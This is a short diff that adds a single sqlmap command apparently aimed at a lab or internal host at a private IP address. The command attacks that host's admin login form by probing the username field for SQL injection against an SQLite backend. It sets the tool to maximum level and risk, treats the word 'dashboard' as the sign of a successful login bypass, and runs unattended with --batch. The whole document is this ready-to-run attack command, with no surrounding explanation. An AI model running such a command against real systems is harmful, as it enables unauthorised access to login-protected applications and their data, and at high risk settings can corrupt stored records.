@@ -1,0 +1,6 @@
+sqlmap -u 'http://172.24.4.136/admin/login' \
+  --data='username=admin&password=admin' \
+  -p username --dbms=sqlite \
+  --level=5 --risk=3 \
+  --string="dashboard" \
+  --batch
